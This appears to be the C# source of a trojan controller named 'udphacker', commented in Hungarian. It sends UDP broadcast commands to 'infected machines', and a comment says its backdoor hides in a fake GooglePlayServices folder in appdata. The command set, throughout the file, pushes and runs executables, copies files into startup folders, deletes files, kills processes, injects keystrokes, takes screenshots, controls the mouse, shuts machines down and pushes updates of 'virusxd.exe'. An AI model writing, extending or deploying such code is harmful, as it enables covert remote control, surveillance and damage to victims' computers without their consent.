using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Windows;

using System.Drawing;
using System.Windows.Forms;
using System.Windows.Shapes;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.Runtime.Remoting.Messaging;
using System.Runtime.InteropServices;

namespace controlller
{
    internal class Program
    {
        public static string currentTarget = "";






        public static Random rnd = new Random();    
        static async Task Main(string[] args)
        {
            Console.Title = "udphacker";

            int PORTvissza = 6665;
            var udpVissza = new UdpClient();
            udpVissza.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);

            udpVissza.Client.Bind(new IPEndPoint(IPAddress.Any, PORTvissza));
            var broadCastEPVissza = new IPEndPoint(IPAddress.Broadcast, PORTvissza);
            //udpVissza.EnableBroadcast = true;



            //csa nandi. A 6666-os port a kommunikacionak használom, controller->kliens
            //a 6667-es port a mouse controlé (mert hülye vagyok és így oldottam meg)
            //a 6665-ös pedig a válaszé (mittomén, screenshot, hostnév, stb)

            //a backdoor pedig az appdata/GooglePlayServices-be dog dolgozni
            int PORT = 6666;
            PORT = Convert.ToInt32(File.ReadAllText("port.txt").Trim());

            var udp = new UdpClient();
            udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);

            udp.Client.Bind(new IPEndPoint(IPAddress.Any, PORT));

            udp.EnableBroadcast = true;

            var broadCastEP = new IPEndPoint(IPAddress.Broadcast, PORT);
            byte[] data = Encoding.UTF8.GetBytes($"");
            //await udp.SendAsync(data, data.Length, broadCastEP);
            _ = TaskMegkapniAzUdpUzeneteket(udpVissza);   //NANDI EZT ENGEDELYEZD HA LATNI AKAROD MI FOLYIK A PORT 6666ON BLAGY BLAGY ---------------------

            _ = SajatUzeneteimOlvasasa(udp);

            while (true)
            {

                string x = $"";
                Console.Write("udphacker>");
                x += Console.ReadLine();
                if (x == null || x == $"") continue;
                string[] megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                string asd = "";

                if (x == "kys")
                {
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    Console.WriteLine("Biztos vagy a [kys] végrehajtásában? (Y/N)");
                    switch (Console.ReadKey().Key)
                    {
                        case ConsoleKey.Y:
                            Console.ForegroundColor = ConsoleColor.Gray;
                            break;
                        case ConsoleKey.N:
                            Console.ForegroundColor = ConsoleColor.Gray;
                            continue;
                        default:
                            break;
                    }
                }
                switch (x.Split(' ')[0])
                {
                    case "help":
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("msgbox   [message]  - uzenetet kuld");
                        Console.WriteLine("exet     [fajl]     - exe fajl átvitele és megnyitása (alapból a documents/Users/data mappába menti)");
                        Console.WriteLine("processS [fajlneve] - valami megynitasa processel");
                        Console.WriteLine("logoff              - kijelentkezteti a komputert");
                        Console.WriteLine("shutdown            - lekapcsolja a komputert");
                        Console.WriteLine("restart             - restartolja a komputert");
                        Console.WriteLine("getresponse         - visszaküldi a fertőzött gépek ipjét, és hostnameját");
                        Console.WriteLine("resetKimenet        - kitorli itt a kimenet.txt tartalmát");
                        Console.WriteLine("scrs                - csinál egy screenshotot a fertőzött gép hostnevével");
                        Console.WriteLine("cls                 - letörli az udphacker commandlineját");
                        Console.WriteLine("mousex   [pl 20]    - hozzáad ennyi pixelt az egér relatív x poziciójához");
                        Console.WriteLine("mousey   [pl 20]    - hozzáad ennyi pixelt az egér relatív y poziciójához");
                        Console.WriteLine("mouseC    - megnyitja EZEN A GÉPEN a Mouse Control-t (figyelem, először exet-el telepíteni kell az MCL.exe-t)");
                        Console.WriteLine("target   [hostname] - beállít egy bizonyos hostnevet targetnek (csak rá hatnak a commandok)");
                        Console.WriteLine("target              - önmagában csak kiírja hogy ki a target");
                        Console.WriteLine("rtarget             - újratölti a targetet, mindenkit céloz ha eddig volt valaki.");
                        Console.WriteLine("kys                 - lekilleli a virust a fertőzött gépen");
                        Console.WriteLine("copy [mit][hova] - Átmásol egy fájlt a fertőzött komputerre. Használható jelzők : %desktop%,%appdata%,%startup%,%startmenu%");
                        Console.WriteLine("kill     [process]  - le killel egy bizonyos futo alkalmazast a neve alapjan");
                        Console.WriteLine("keystroke [üzenet]  - egyszerű keystroke, amit ide beírsz, azt az éppen fent lévő programba beirja");
                        Console.WriteLine("setwallpaper [kep]  - na szerinted ez mi");
                        Console.WriteLine("delete [fajl]       - na szted mi");
                        Console.WriteLine("disableExe [nev]    - letilt egy bizonyos exe futasat a hatterben (eloszor masold be databa).");
                        Console.WriteLine("rPort [uj port]     - újra kalibrájla hogy milyen porton fussanak az udp kérések (ha rnd, akkor 7000-8000 között)");
                        Console.WriteLine("port                - kiirja hogy melyik porton vagy");

                        Console.ForegroundColor = ConsoleColor.Gray;
                        continue;

                    case "port":
                        Console.WriteLine(PORT);
                        continue;

                    case "rPort":
                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("rPort");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: rPort");

                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }


                        //küld mégegyet mer bugos a rendszer
                        if (asd.Trim() == "rnd")
                        {
                            asd = Convert.ToString(rnd.Next(7000, 8000));
                        }
                        data = Encoding.UTF8.GetBytes(asd.Trim());
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: {asd}");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        File.WriteAllText("port.txt", asd.Trim());

                        Process.Start("controller.exe");
                        Environment.Exit(0);

                        continue;

                    case "disableExe":
                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("eD");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: eD");

                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }


                        //küld mégegyet mer bugos a rendszer
                        data = Encoding.UTF8.GetBytes(asd);
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: {asd}");
                        Console.ForegroundColor = ConsoleColor.Gray;

                        continue;



                    case "delete":
                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("delete");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: delete");

                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }


                        //küld mégegyet mer bugos a rendszer
                        data = Encoding.UTF8.GetBytes(asd);
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: {asd}");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        
                        continue;


                    case "resetKimenet":
                        File.WriteAllText("kimenet.txt", "");
                        continue;
                    case "setwallpaper":
                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("setwallpaper");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: setwallpaper");

                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }


                        //küld mégegyet mer bugos a rendszer
                        data = Encoding.UTF8.GetBytes(asd);
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: {asd}");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        continue;
                    


                    case "keystroke":
                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("keystroke");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: keystroke");

                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }


                        data = Encoding.UTF8.GetBytes(asd);
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: {asd}");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        continue;


                    case "kill":
                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("kill");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: kill");

                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }


                        //küld mégegyet mer bugos a rendszer
                        data = Encoding.UTF8.GetBytes(asd);
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: {asd}");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        continue;




                    case "copy":

                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("copy");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: copy");


                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }
                        /*
                        byte[] newData = File.ReadAllBytes("blob.exe");
                        udp.Send(newData, data.Length, broadCastEP);
                        foreach (var item in newData)
                        {
                            Console.WriteLine(item);
                        }*/

                        data = File.ReadAllBytes(x.Split(' ').Skip(1).ToArray()[0].Trim());
                        //-------------------------------------------------------------------
                        // Küldés előtt:
                        int packetSize = 1024;
                        int packetCount = (int)Math.Ceiling((double)data.Length / packetSize);

                        // "Fejléc" csomag létrehozása
                        string header = $"{x.Split(' ').Skip(1).ToArray()[0].Trim()} {data.Length} {packetCount} {x.Split(' ').Skip(1).ToArray()[1].Trim()}";
                        byte[] headerBytes = Encoding.UTF8.GetBytes(header);

                        // Elküldöd először a header-t
                        udp.Send(headerBytes, headerBytes.Length, broadCastEP);


                        Console.ForegroundColor = ConsoleColor.Cyan;

                        for (int i = 0; i < data.Length; i += packetSize)
                        {
                            int size = Math.Min(packetSize, data.Length - i);
                            byte[] packet = new byte[size];
                            Array.Copy(data, i, packet, 0, size);
                            udp.Send(packet, packet.Length, broadCastEP);
                            Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: :{i}");
                            await Task.Delay(1);
                        }
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("Sikeres átmásolás a fertőzött gép(ek)re!");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        continue;



                    case "kys":

                        currentTarget = "";
                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("kys");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("[Vírus sikeresen leállítva!");
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: kys");

                        
                        //küld mégegyet mer bugos a rendszer
                        data = Encoding.UTF8.GetBytes("");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: ");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        continue;

                    case "update":
                        data = Encoding.UTF8.GetBytes("update");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: update");


                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }

                        data = File.ReadAllBytes(".\\listener\\virusxd.exe");
                        //-------------------------------------------------------------------
                        // Küldés előtt:
                        packetSize = 1024;
                        packetCount = (int)Math.Ceiling((double)data.Length / packetSize);

                        // "Fejléc" csomag létrehozása
                        
                        header = $"update.exe {data.Length} {packetCount}";
                        headerBytes = Encoding.UTF8.GetBytes(header);
                        Console.WriteLine(header);
                        // Elküldöd először a header-t
                        udp.Send(headerBytes, headerBytes.Length, broadCastEP);



                        for (int i = 0; i < data.Length; i += packetSize)
                        {
                            int size = Math.Min(packetSize, data.Length - i);
                            byte[] packet = new byte[size];
                            Array.Copy(data, i, packet, 0, size);
                            udp.Send(packet, packet.Length, broadCastEP);
                            Console.WriteLine($"Update broadcast elküldve [{broadCastEP}]: :{i}");
                            await Task.Delay(1);
                        }

                        Console.ForegroundColor = ConsoleColor.Gray;

                        continue;



                    case "target":
                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }

                        if (asd.Trim() == "")
                        {
                            if (currentTarget == "")
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("Nincsen kiválasztott célpont!");
                                Console.ForegroundColor = ConsoleColor.Gray;
                            } else
                            {
                                Console.ForegroundColor = ConsoleColor.Cyan;
                                Console.Write($"A kiválasztott célpont : ");
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine($"{currentTarget}");
                                Console.ForegroundColor = ConsoleColor.Gray;
                                Console.ForegroundColor = ConsoleColor.Gray;
                            }
                        } else
                        {
                            //először elküldi milyen utasítás legyen :
                            data = Encoding.UTF8.GetBytes("target");
                            udp.Send(data, data.Length, broadCastEP);
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: target");
                            //aztán broadcastolja a megjelenitendo szoveget : 
                            
                            data = Encoding.UTF8.GetBytes(asd.Trim());

                            udp.Send(data, data.Length, broadCastEP);
                            //currentTarget = asd;
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.Write($"Broadcast elküldve (új célpont beállítva) [{broadCastEP}] : ");
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine($"{asd}");
                            Console.ForegroundColor = ConsoleColor.Gray;
                        }
                        


                        continue;


                    case "rtarget":
                        //currentTarget = "";
                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("rtarget");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("[jelenlegi célpont sikeresen vissza állítva]");
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: rtarget");

                        /*
                        //küld mégegyet mer bugos a rendszer
                        data = Encoding.UTF8.GetBytes("");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: ");*/
                        Console.ForegroundColor = ConsoleColor.Gray;
                        continue;


                    case "mousex":
                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";

                        //először elküldi milyen utasítás legyen :
                        data = Encoding.UTF8.GetBytes("mousex");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: mousex");
                        //aztán broadcastolja a megjelenitendo szoveget : 
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }
                        data = Encoding.UTF8.GetBytes(asd.Trim());

                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: {asd}");
                        Console.ForegroundColor = ConsoleColor.Gray;



                        continue;

                    case "mousey":
                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";

                        //először elküldi milyen utasítás legyen :
                        data = Encoding.UTF8.GetBytes("mousey");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: mousey");
                        //aztán broadcastolja a megjelenitendo szoveget : 
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }
                        data = Encoding.UTF8.GetBytes(asd.Trim());

                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: {asd}");
                        Console.ForegroundColor = ConsoleColor.Gray;


                        continue;



                    case "cls":
                        Console.Clear();
                        continue;


                    case "msgbox":
                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";

                        //először elküldi milyen utasítás legyen :
                        data = Encoding.UTF8.GetBytes("msgb");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: msgb");
                        //aztán broadcastolja a megjelenitendo szoveget : 
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }
                        data = Encoding.UTF8.GetBytes(asd);

                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor= ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: {asd}");
                        Console.ForegroundColor = ConsoleColor.Gray;

                        continue;
                    case "exet"://chatgpt
                        Console.WriteLine("asd");
                        data = Encoding.UTF8.GetBytes("exet");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: exet");


                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }
                        /*
                        byte[] newData = File.ReadAllBytes("blob.exe");
                        udp.Send(newData, data.Length, broadCastEP);
                        foreach (var item in newData)
                        {
                            Console.WriteLine(item);
                        }*/

                        data = File.ReadAllBytes(asd.Trim());
                        //-------------------------------------------------------------------
                        // Küldés előtt:
                        packetSize = 1024;
                        packetCount = (int)Math.Ceiling((double)data.Length / packetSize);

                        // "Fejléc" csomag létrehozása
                        header = $"{asd.Trim()} {data.Length} {packetCount}";
                        headerBytes = Encoding.UTF8.GetBytes(header);

                        // Elküldöd először a header-t
                        udp.Send(headerBytes, headerBytes.Length, broadCastEP);



                        for (int i = 0; i < data.Length; i += packetSize)
                        {
                            int size = Math.Min(packetSize, data.Length - i);
                            byte[] packet = new byte[size];
                            Array.Copy(data, i, packet, 0, size);
                            udp.Send(packet, packet.Length, broadCastEP);
                            Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: :{i}");
                            await Task.Delay(1);
                        }

                        Console.ForegroundColor = ConsoleColor.Gray;
                        continue;

                    case "processS"://na ezt kurvára később fogom leprogramoznixd
                        megjelenitendoSzovegDarabolva = x.Split(' ').Skip(1).ToArray();
                        asd = "";

                        //először elküldi milyen utasítás legyen :
                        data = Encoding.UTF8.GetBytes("processS");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: processS");

                        //aztán broadcastolja hogy melyiket nyissa meg : 
                        foreach (string a in megjelenitendoSzovegDarabolva)
                        {
                            asd += a;
                            asd += " ";
                        }

                        data = Encoding.UTF8.GetBytes(asd);

                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: {asd}");
                        Console.ForegroundColor = ConsoleColor.Gray;

                        continue;

                    case "logoff":

                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("logoff");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: logoff");
                        data = Encoding.UTF8.GetBytes("msgb");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: msgb");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        continue;
                    case "shutdown":
                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("shutdown");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: shutdown");
                        data = Encoding.UTF8.GetBytes("");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: ");
                        Console.ForegroundColor = ConsoleColor.Gray;

                        continue;
                    case "restart":
                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("restart");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: restart");
                        data = Encoding.UTF8.GetBytes("");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: ");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        continue;

                    case "getresponse":
                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("getres");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: getres");

                        //aztán elkuld egy random szoveget mer nem tom : 
                        asd = "";
                        data = Encoding.UTF8.GetBytes(asd);

                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: {asd}");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Process.Start("kimenet.txt");
                        continue;


                    case "scrs":
                        /*
                         ezeket importáltam:
                        using System.Drawing;
                        using System.Windows.Forms;
                        using System.Windows.Shapes;
                        using System.Drawing.Imaging;
                         */

                        /*screenshot csinálás : 
                        // képernyő mérete
                        System.Drawing.Rectangle bounds = Screen.PrimaryScreen.Bounds;

                        // bitmap a képernyő méretével
                        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                        {
                            // "lemásolja" a képernyő tartalmát a bitmapra
                            using (Graphics g = Graphics.FromImage(bitmap))
                            {
                                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                            }

                            // elmenti a screenshotot
                            string path = "screenshot.png";
                            bitmap.Save(path, ImageFormat.Png);

                            Console.WriteLine($"Screenshot mentve: {path}");
                        }*/
                        //mivel ez csak egy utasitas, ezert csak elkuldixd :
                        data = Encoding.UTF8.GetBytes("scrs");
                        udp.Send(data, data.Length, broadCastEP);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Broadcast elküldve [{broadCastEP}]: scrs");
                        Console.ForegroundColor = ConsoleColor.Gray;

                        continue;

                    case "mouseC":

                        if (File.Exists("mouseControl.exe"))
                        {
                            Process.Start("mouseControl.exe");
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"Mouse Control megnyitva! Alt+F4-el tudod bezárni ha már nem kívánod használni");
                            Console.ForegroundColor = ConsoleColor.Gray;
                        }  else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"A mouseControl.exe fájl nem található!");
                            Console.ForegroundColor = ConsoleColor.Gray;
                        }
                        continue;
                    default:
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("nincs ilyen parancs");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        continue;
                }
                


                

            }
        }
        static async Task TaskMegkapniAzUdpUzeneteket(UdpClient udpVisszaa)
        {
            while (true)
            {
                var result = await udpVisszaa.ReceiveAsync();
                var message = Encoding.UTF8.GetString(result.Buffer);
                //Console.WriteLine($"Üzenet {result.RemoteEndPoint}: {message}");
                /*
                if (message.StartsWith("") == "scrs")
                {
                    result = await udpVisszaa.ReceiveAsync();
                    message = Encoding.UTF8.GetString(result.Buffer);
                }*/


                File.AppendAllText("kimenet.txt", $"{message}");
                //Console.WriteLine($"{message} asd");

            }
        }

        static async Task SajatUzeneteimOlvasasa(UdpClient udp)
        {
            string instruct = "";
            while (true)
            {
                var result = await udp.ReceiveAsync();
                var message = Encoding.UTF8.GetString(result.Buffer);
                //Console.WriteLine($"Üzenet {result.RemoteEndPoint}: {message}");

                if (message == "rtarget") currentTarget = "";
                if (instruct != "") if (instruct == "target") currentTarget = message;

                instruct = message;

            }
        }
    }
}
